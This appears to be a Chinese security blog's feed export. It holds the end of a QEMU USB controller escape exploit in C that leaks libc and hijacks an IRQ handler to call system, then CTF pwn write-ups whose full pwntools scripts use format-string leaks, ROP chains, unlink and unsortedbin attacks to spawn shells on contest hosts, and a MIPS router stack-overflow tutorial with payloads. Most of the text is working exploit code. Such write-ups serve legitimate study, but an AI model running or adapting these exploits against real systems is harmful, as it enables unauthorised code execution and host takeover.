&lt;&lt; 7 | 2 &lt;&lt; 8 | 8 &lt;&lt; 16; // 2 &lt;&lt;8 go to do_token_setup qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void set_length3(uint16_t len, uint8_t in)&#123; memset(dmabuf + 0x400, 0x61, 0x1000); mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); setup_buf[0] = in; setup_buf[6] = len &amp; 0xff; setup_buf[7] = (len &gt;&gt; 8) &amp; 0xff; qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); *(int *)&amp;dmabuf[0x1304] = 0x2; *(int *)&amp;dmabuf[0x1308] = 0x5000; *(int *)&amp;dmabuf[0x130c] = 0xffffefe8; //set s-&gt;setup_index -8 qtd-&gt;token = 1 &lt;&lt; 7 | 0 &lt;&lt; 8 | 0x1010 &lt;&lt; 16; //write len is 0x1000, 0 &lt;&lt; 8 got to write qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); qtd-&gt;bufptr[1] = virt2phys(dmabuf + 0x1300); dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void set_length4(uint16_t len, uint8_t in)&#123; mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); setup_buf[0] = in; setup_buf[6] = len &amp; 0xff; setup_buf[7] = (len &gt;&gt; 8) &amp; 0xff; qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); *(int *)&amp;dmabuf[0x1308] = 0x2; //*(int *)&amp;dmabuf[0x130c] = 0x14f4-0x1018; *(ptr + 1221) = 0x16fc -0x1018; *(ptr + 1221 - 2) = 2; qtd-&gt;token = 1 &lt;&lt; 7 | 0 &lt;&lt; 8 | 0x1018 &lt;&lt; 16; qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); qtd-&gt;bufptr[1] = virt2phys(dmabuf + 0x1300); dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void do_copy_read(uint16_t len, uint8_t in)&#123; mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); qtd-&gt;token = 1 &lt;&lt; 7 | 1 &lt;&lt; 8 | 0x1100 &lt;&lt; 16; qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); qtd-&gt;bufptr[1] = virt2phys(dmabuf + 0x1300); dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void set_length6(uint16_t len, uint8_t in)&#123; memset(dmabuf + 0x400, 0x61, 0x1000); mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); setup_buf[0] = in; setup_buf[6] = len &amp; 0xff; setup_buf[7] = (len &gt;&gt; 8) &amp; 0xff; qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); *(int *)&amp;dmabuf[0x1304] = 0x2; *(int *)&amp;dmabuf[0x1308] = 0x5000; *(int *)&amp;dmabuf[0x130c] = 0xffffe524; //set s-&gt;setup_index -0xacc (point to irq-&gt;handler) qtd-&gt;token = 1 &lt;&lt; 7 | 0 &lt;&lt; 8 | 0x1010 &lt;&lt; 16; //write len is 0x1000, 0 &lt;&lt; 8 got to write qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); qtd-&gt;bufptr[1] = virt2phys(dmabuf + 0x1300); dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void final_write(uint16_t len, uint8_t in,long long system,long long irq_handler)&#123; mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); setup_buf[0] = in; setup_buf[6] = len &amp; 0xff; setup_buf[7] = (len &gt;&gt; 8) &amp; 0xff; qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); *(int *)&amp;dmabuf[0x1308] = 0x2; unsigned long long *ptr2; ptr2 = &amp;dmabuf[0x300]; *(ptr2) = system;//system plt *(ptr2 + 1) = irq_handler + 0x10; *(ptr2 + 2) = 0x636c616378; //xcalc *(ptr + 1221) = 0x16fc - 0x1018; *(ptr + 1221 - 2) = 2; qtd-&gt;token = 1 &lt;&lt; 7 | 0 &lt;&lt; 8 | 0x18 &lt;&lt; 16; qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); qtd-&gt;bufptr[1] = virt2phys(dmabuf + 0x1300); dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void check()&#123; while (mmio_read(0x20) != 0x100400080000) &#123; printf("error:%p ", mmio_read(0x20)); usleep(100000); &#125;&#125;int main()&#123; setbuf(stdout, 0); init(); puts("Start!"); //---------------------- First Step : leak data_buf addr //send a normal packet,set s-&gt;setup_state to SETUP_DATA_STATE(2) puts("set s-&gt;setup_state:SETUP_DATA_STATE"); init_state(); //getchar(); check(); //send a deformity,set s-&gt;setup_len to 0x5000 puts("set s-&gt;setup_len:0x5000"); set_length(0x5000, 0); //getchar(); usleep(500000); //write out of bounds puts("write out of bounds,set setup_index -8"); set_length3(0x5000, 0x80); //getchar(); check(); //write out of bounds,set s-&gt;setup_buf for leak address puts("write out of bounds,set s-&gt;setup_buf and s-&gt;setup_index"); set_length4(0x5000, 0x80); //getchar(); check(); //now leak address //read text address puts("read text address"); do_copy_read(0x5000,0x80); //getchar(); check(); long long *ptrr = dmabuf + 0x300; long long libc_base = *ptrr - 0x51a92b; long long *heap = dmabuf + 0x308; long long system = libc_base + 0x2038d0; long long irq_handler = *heap - 0x2e88; long long irq_opaque = *heap - 0x2e80; printf("libc_base: %p\n",libc_base); printf("system: %p\n",system); printf("irq_handler: %p\n",irq_handler); printf("irq_opaque: %p\n",irq_opaque); //irq-&gt;handler: 0x5555592bb138 //irq-&gt;opaque: 0x5555592bb140 //restart init_state(); check(); set_length(0x5000, 0); usleep(500000); //write irq-&gt;handler puts("change s-&gt;setup_index point to irq-&gt;handler"); set_length6(0x5000,0x80); //getchar(); check(); puts("change irq-&gt;handler"); final_write(0x5000,0x80,system,irq_handler); //getchar(); check(); puts("pwn it?"); return 0;&#125;]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第三届“强网”拟态精英挑战赛pwn全解]]></title>
    <url>%2F2020%2F06%2F23%2F%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%81%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[easy_stack格式化字符串泄漏canary后和libc，gets栈溢出 exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn import *import syslocal = 0if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./easy-stack') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("172.35.4.43","9999") libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))pay = "%21$p-%23$p"sla("stack\n",pay)puts_addr = int(ru("-").strip("-"),16) - 362canary = int(ru("\n").strip('\n'),16)libc_base = puts_addr - libc.symbols['puts']system = libc_base + libc.symbols['system']binsh = libc_base + libc.search("/bin/sh\x00").next()pop_rdi = libc_base + 0x21102show("puts_addr",puts_addr)show("canary",canary)pay = 0x88*'a' + p64(canary) + 'b'*8pay += p64(pop_rdi) + p64(binsh)pay += p64(system)sla("gift\n",pay)p.interactive() easy_stack2本来是easy_stack的升级版，加了mimicobx，但是长时间0解后降低了难度，变成了一栈简单的栈溢出题，但是远程过滤了不可见字符，也就是说无法泄漏地址，一旦出现不可见字符连接就会自动断开；于是泄漏地址ret2libc的方法不可行。 方法1：64位ret2dl_runtime_resolve方法2：利用read拿到一个syscall，因为got表可写，所以修改read的低字节为’\x5e’，通过write输出0x3b个可见字符控制 rax为0x3b最后调用execv(“/bin/sh\x00”,0,0) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8from pwn import *import syslocal = 0if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./easy-stack2') elf = ELF('./easy-stack2') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("172.35.100.100",10004) elf = ELF('./easy-stack2') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))pop_rdi = 0x0000000000400623pop_rsi_r15 = 0x0000000000400621mov_call = 0x400600pppp_ret = 0x40061Amain = 0x400587'''pay = 0x88*'a'pay += p64(pppp_ret) pay += p64(0) + p64(1) + p64(elf.got['write']) + p64(4) + p64(elf.got['read']) + p64(1)pay += p64(mov_call) + p64(0)*7pay += p64(main)# gdb.attach(p,"b *0x400584")sla("World\n",pay)'''binsh = 0x601030# read /bin/shpay = 0x88*'a'pay += p64(pop_rdi) + p64(0)pay += p64(pop_rsi_r15) + p64(binsh) + p64(0)pay += p64(elf.plt['read'])pay += p64(main)# gdb.attach(p,"b *0x400584")sla("World\n",pay)pause()sl("/bin/sh\x00" + "B"*59)# set read to syscallpay = 0x88*'a'pay += p64(pop_rdi) + p64(0)pay += p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0)pay += p64(elf.plt['read'])pay += p64(pppp_ret)pay += p64(0) + p64(1) + p64(elf.got['write']) + p64(59) + p64(binsh + 8) + p64(1)pay += p64(mov_call)pay += p64(0)*7# now rax = 0x3bpay += p64(pppp_ret)pay += p64(0) + p64(1) + p64(elf.got['read']) + p64(0) + p64(0) + p64(binsh)pay += p64(mov_call)# gdb.attach(p,"b *0x400584")sla("World\n",pay)sleep(0.1)pause()sd('\x5e')p.interactive() emmmm]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[路由器漏洞挖掘入门之栈溢出]]></title>
    <url>%2F2020%2F06%2F21%2F%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[x86和MIPS指令集的差异1、MIPS指令系统大量使用寄存器，包括返回地址也是存放在ra寄存器中的 2、没有堆栈直接操作的指令，也就是就没有push 和pop 指令 3、所有指令都是32位编码，也就是说所有的数据和指令都是4字节对齐 由于MIPS固定指令长度，造成其编译后的二进制文件和内存占用空间比x86的要大 MIPS指令集使用uclibc C标准库，x86使用libc的C标准库 MIPS的指令用法和两者的差异可以参考这里 搭建MIPS编译环境buidRoot下载 将buildroot解压后，我们的第一步是创建默认配置，buildroot为了方便用户使用，提前配置好了很多平台的配置，在configs文件夹里； 因为我们的目标平台是mips32，所以找到qemu_mips32r2el_malta_defconfig这个配置，下面有一个差不多的qemu_mips32r2_malta_defconfig，区别是多了个el，”el”是小端的意思 ，这里我们选择小端。 回到根目录：执行make qemu_mips32r2el_malta_defconfig 在终端输入make menuconfig进一步配置，输入后会出现如下界面 Target option: 选择目标平台，大端小端等等； 进入Target option可以看到这些配置都被选好了，原因是之前执行了make qemu_mips32r2el_malta_defconfig已经先选好了，如果没有先执行了配置文件就需要进入这里配置 其它的都不用碰他，当然如果你想探索一下也可以的 配置好了之后，出来make即可，等个5-6个小时就行了 IDA mipsrop插件是一个用来找mips汇编gadget的工具 https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py 直接放到plugins下就行了 IDA7.0也可以用 主要的几个用法： 1234mipsrop.stackfinder() 寻找栈数据可控的 rop，建立 和a0、a1 寄存器的关系mipsrop.summary() 列出所有的可用ropmipsrop.system() 寻找命令执行的ropmipsrop.find(xxx) 查找 find 函数参数的rop，类似正则匹配 前置知识 – 叶子函数和非叶子函数叶子函数和非叶子函数是两个非常重要的概念，两者的一些特性造成了对栈溢出利用方法的差异；在某个函数中，如果这个函数不调用其它函数，那么就称这个函数为叶子函数，反之，为非叶子函数，好理解吧。 举个例子: main 为叶子函数，因为main中没有调用其它函数 1234567int main()&#123; int i; int sum = 0; for(i = 0;i&lt;5;i++)&#123; sum += i; &#125;&#125; main 为非叶子函数，因为main中调用了printf函数 12345678int main()&#123; int i; int sum = 0; for(i = 0;i&lt;5;i++)&#123; sum += i; &#125; printf("sum = %d",sum);&#125; 叶子函数的返回地址是直接放在ra寄存器中的，而非叶子函数需要调用另外的函数，这里的差异就导致非叶子函数需要把当前的返回地址暂时存放在栈上 1、非叶子函数中，有sw $ra,xxx的操作，在函数退出时，会将存放在栈上的原来存放在ra寄存器中的值 重新赋值给ra寄存器中 2、叶子函数中，就没有sw $ra,xxx操作 一个简单的栈溢出12345678910111213141516#include &lt;stdio.h&gt;void vuln()&#123; system("/bin/sh");&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf("copy success!n");&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125;// ~/buildroot-2020.02/output/host/bin/mipsel-linux-gcc test.c -o test -static 利用buildroot中的mipsel-linux-gcc编译程序 动态分析123窗口1:qemu-mipsel -g 1234 ./test `cyclic 100`窗口2:gdb-multiarch ./test之后gdb中 target remote :1234 attach上即可 运行，程序 crash 后通过cyclic -l得到溢出长度为28 这里因为main函数是一个非叶子函数所以我们可以直接覆盖栈上main的返回地址为vuln函数从而get shell 1qemu-mipsel ./test `python -c &quot;print &apos;a&apos;*28+&apos;\x70\x03\x40\x00&apos;&quot;` rop chain的利用举另一个例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat("passwd",&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen("passwd","rb")) == NULL) &#123; printf("Cannot open file passwd!n"); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = '\x00'; if(!strcmp(buf,"adminpwd")) &#123; do_system_0(count,"ls -l"); &#125; else &#123; printf("you have an invalid password!n"); &#125; fclose(fp);&#125;// ~/buildroot-2020.02/output/host/bin/mipsel-linux-gcc test.c -o test -static 溢出还是在main函数，且main是一个非叶子函数，所以可以通过溢出控制程序流 但是我们需要控制 dy_system_0函数的第二个参数(在a1寄存器中),所以我们就需要找到将栈上的内容赋值给a1寄存器的汇编语句，可以直接使用mipsrop.stackfinder()命令找找看 1234567Python&gt;mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------| Address | Action | Control Jump |----------------------------------------------------------------------------------------------------------------| 0x004034B0 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) |----------------------------------------------------------------------------------------------------------------Found 1 matching gadgets addiu $a1,$sp,0x58+var_40 == addiu $a1,$sp,24，所以只需要在sp+0x24的位置放上字符串’/bin/sh\x00’，再调用do_system_0就行了 同样gdb attach上，动态确定字符串的位置 1234pwndbg&gt; p/x $sp+0x24$2 = 0x76ffedccpwndbg&gt; distance 0x76ffedcc 0x76ffec080x76ffedcc-&gt;0x76ffec08 is -0x1c4 bytes (-0x71 words) payload : 1python -c "print 'a'*0x19c + '\xb0\x34\x40\x00' + 0x18*'b' + '/bin/sh\x00' + 'c'*0x34 + '\x70\x03\x40\x00'" &gt; passwd]]></content>
      <categories>
        <category>IOT</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[解决git clone下载慢或失败问题]]></title>
    <url>%2F2020%2F06%2F21%2F%E8%A7%A3%E5%86%B3git%20clone%E4%B8%8B%E8%BD%BD%E6%85%A2%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[网上的修改本机host文件方法亲测不管用 通过码去云下载是真的香 https://gitee.com/ 注册并登录后创建仓库 拉到下面导入已有你仓库 将github链接导入并创建就完成了 之后进入gitee中的库下载就行了，速度快到飞起]]></content>
  </entry>
  <entry>
    <title><![CDATA[第五**空间pwn部分wp]]></title>
    <url>%2F2020%2F06%2F21%2F%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%2F</url>
    <content type="text"><![CDATA[发现太久没有写博客了，就放一下刚打完的被喷得怪可怜的第5**空间的一点wp吧。 立雪edit 函数没有对size进行检测，所以可以任意长度的堆溢出 ​ 而且程序存在后门函数，unlink到0x602088修改为0xffff即可(其实最快速的做法是unsortedbin attack到0x602088) exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *\# context.log_level = 'debug'\# p = process('./pwn15')p = remote("111.33.164.4","50015")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def new(l,data):​ ru("choice:")​ sl('1')​ ru("note:")​ sl(str(l))​ ru("note:")​ sl(data)def delete(id):​ ru("choice:")​ sl('3')​ ru("Index:")​ sl(str(id))def edit(id,l,data):​ ru("choice:")​ sl('2')​ ru("Index:")​ sl(str(id))​ ru("note:")​ sl(str(l))​ ru("note:")​ sl(data)ptr = 0x6020C0fd = ptr - 8*3bk = ptr - 8*2\# pay = 0x18*'a' + p64(0xffffffffffffffff)\# edit(0,0x28,pay)new(0x20,'b')new(0xa0,'c')new(0x20,'a')pay = p64(0) + p64(0x20) + p64(fd) + p64(bk) + p64(0x20) + p64(0xb0)edit(0,0x30,pay)delete(1)pay = p64(0)*3 + p64(0x602088)edit(0,0x40,pay)edit(0,8,p32(0xffff))ru("choice:")sl('2019')\# gdb.attach(p)p.interactive() 拈花 分析函数可以知道有明显的栈溢出漏洞，直接ret2libc攻击，先puts出puts_got的真实地址然后再跳一次，回到main，再执行system函数直接getshell： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./pwn11')if local:​ p = process('./pwn11')​ libc = elf.libcelse:​ p = remote('111.33.164.4',50011)​ libc = ELF('./libc.so.6')sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive() def bk(addr):​ gdb.attach(p,"b *"+str(hex(addr))) ru("please input your name")sl('king')ru("Let's start a game,can you guess the key?")pop_rdi_ret = 0x00000000004012abputs_got = elf.got["puts"]puts_plt = elf.symbols["puts"]py = ''py += 'a'*0x20py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(puts_got)py += p64(puts_plt)py += p64(0x401162)sl(py)ru("fail!\n")puts_addr = u64(rc(6).ljust(8,'\x00'))print "puts--&gt;" + hex(puts_addr)system = puts_addr - libc.symbols["puts"] + libc.symbols["system"]binsh = puts_addr - libc.symbols["puts"] + libc.search('/bin/sh\x00').next()py = ''py += 'a'*0x20py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(binsh)py += p64(system)ru("please input your name")sl('king')ru("Let's start a game,can you guess the key?")sl(py)p.interactive() 於讴​ ​ 这里输入小于0x3E7的值就可以进去一波函数，但是没什么用，虽然不知道那里是什么(直接没理会)，输入大小大于0x3E7，直接退出回到main，然后直接有个栈溢出漏洞（sub_4007E2），那么和拈花一样，直接先puts出真实地址然后回跳到main，再执行system函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./pwn6')if local:​ p = process('./pwn6')​ libc = elf.libcelse:​ p = remote('111.33.164.4', 50006)​ libc = ELF('./libc-2.19.so')sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive() def debug(addr,PIE=True):​ if PIE:​ text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)​ gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))​ else:​ gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def bk(addr):​ gdb.attach(p,"b *"+str(hex(addr))) sl('10000')ru("OH, WHY ARE YOU SO GOOD?")pop_rdi_ret = 0x0414fc3puts_got = elf.got["puts"]puts_plt = elf.symbols["puts"]py = ''py += 'a'*0x10py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(puts_got)py += p64(puts_plt)py += p64(0x400793)sl(py)rc(1)puts_addr = u64(rc(6).ljust(8,'\x00'))print "puts--&gt;" + hex(puts_addr)system = puts_addr - libc.symbols["puts"] + libc.symbols["system"]binsh = puts_addr - libc.symbols["puts"] + libc.search('/bin/sh\x00').next()py = ''py += 'a'*0x10py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(binsh)py += p64(system)sl('10000')ru("OH, WHY ARE YOU SO GOOD?")sl(py)p.interactive() 副墨​ 这题有点意思，首先覆盖seed为0，写C脚本跑伪随机数： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;\#include &lt;string.h&gt;int main()&#123;​ int seed = 0;​ srand(seed);​ int v14=0;​ for(int i=0;i&lt;=9;i++)​ &#123;​ v14 = rand() % 0x1869Fu + 1;​ printf("%d\n",v14);​ &#125;&#125; 跑出随机数：a = [7427,39356,9595,54062,67371,42578,92585,76990,22615,53318] 第一次写入栈中的数据大小(0x2A)，这里seed的偏移为0x1c，所以可以覆盖为0： 1234567py = ''py += "-%17$p-%23$p-"py = py.ljust(0x1c,'a')py += p64(0) 因为有格式化字符串漏洞，所以可以直接打印出canary和base基地址，然后就可以先puts出真实地址，然后回跳一次main，再执行system，思路和前面的差不多（这里onegadget用不了） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./bf')if local:​ p = process('./bf')​ libc = elf.libcelse:​ p = remote('111.33.164.4',50001)​ libc = ELF('./libc-2.19.so') sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive() def debug(addr,PIE=True):​ if PIE:​ text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)​ gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))​ else:​ gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) a = [7427,39356,9595,54062,67371,42578,92585,76990,22615,53318]ru("Are you sure want to play the game?")sl('1')ru("Input your name : ")py = ''py += "-%17$p-%23$p-"py = py.ljust(0x1c,'a')py += p64(0)sl(py)for i in range(10):​ ru('Now guess:')​ sl(str(a[i]))ru("-")canary = int(ru("-")[:-1],16)print "canary---&gt;" + hex(canary)addr = int(rc(14),16)addr = addr&amp;0xfffffffff000print "addr---&gt;" + hex(addr)puts_got = elf.got["puts"] + addrmain = addr + 0xABFputs_plt = elf.symbols["puts"] + addrpop_rdi_ret = 0x0db3 + addr\#onegadget = addr - libc.symbols["__libc_start_main"] + libc.symbols["system"]py = ''py += 'a'*0x34py += p64(canary)py += 'bbbbbbbb'py += p64(pop_rdi_ret)py += p64(puts_got)py += p64(puts_plt)py += p64(main)sl(py)puts_aa = u64(ru("Are")[2:-4].ljust(8,'\x00'))print "puts_aa----&gt;" + hex(puts_aa)system = puts_aa - libc.symbols["puts"] + libc.symbols["system"]binsh = puts_aa - libc.symbols["puts"] + libc.search("/bin/sh\x00").next()ru("to play the game?")sl('1')ru("Input your name : ")py = ''py += "-%17$p-%18$p-"py = py.ljust(0x1c,'a')py += p64(0)sl(py)for i in range(10):​ ru('Now guess:')​ sl(str(a[i]))py = ''py += 'a'*0x34py += p64(canary)py += 'bbbbbbbb'py += p64(pop_rdi_ret)py += p64(binsh)py += p64(system)sl(py)p.interactive() 正定跟立雪基本一样，做立雪的时候傻逼了用了麻烦的unlink，其实可以直接unsortedbin attack exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *\# context.log_level = 'debug'\# p = process('./pwn14')p = remote("111.33.164.4","50014")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def new(l,data):​ ru("choice : ")​ sl('1')​ ru("note : ")​ sl(str(l))​ ru("note:")​ sl(data)def delete(id):​ ru("choice : ")​ sl('3')​ ru("Index :")​ sl(str(id))def edit(id,l,data):​ ru("choice : ")​ sl('2')​ ru("Index :")​ sl(str(id))​ ru("note : ")​ sl(str(l))​ ru("note : ")​ sl(data)new(8,'n')new(0xa0,'a')new(8,'b')delete(1)pay = p64(0)*3 + p64(0xb1) + p64(0) + p64(0x4040A0 - 0x10)edit(0,0x40,pay)new(0xa0,'c')ru("choice : ")sl('70')\# gdb.attach(p)p.interactive() 一苇这题也存在后门 也存在栈溢出，先自用buf没有初始化打印出代码段地址绕过PIE，之后栈溢出跳转到后门 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8from pwn import *context.log_level = 'debug'\#内存地址随机化def debug(addr,PIE=True):​ if PIE:​ text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)​ print "breakpoint_addr --&gt; " + hex(text_base + 0x202040)​ gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))​ else:​ gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) \# p = process('./pwn13')p = remote("111.33.164.4","50013")p.recvuntil("choice:")p.sendline('1')p.recvuntil("massage\n")\# p.sendline('a'*0x28 + '\x50')p.send('a'*9)p.recvuntil('a'*8)text_addr = u64(p.recv(6).ljust(8,'\x00')) - 0x61text_addr = text_addr &amp; 0xfffffffff000log.info("text_addr --&gt; %s",hex(text_addr))p.recvuntil("choice:")p.sendline('1')p.recvuntil("massage\n")\# debug(0xa2c)p.sendline('a'*0x28 + p64(text_addr + 0xa50))p.interactive() 坐忘存在栈溢出，但是开启了canary ，先将canary的低位’\x00’覆盖泄漏出canary 之后就快乐溢出了，因为程序是静态编译所以ropchain一把梭，但是程序写了个base64解密，所以所有的输入都要经过base64加密 exp: 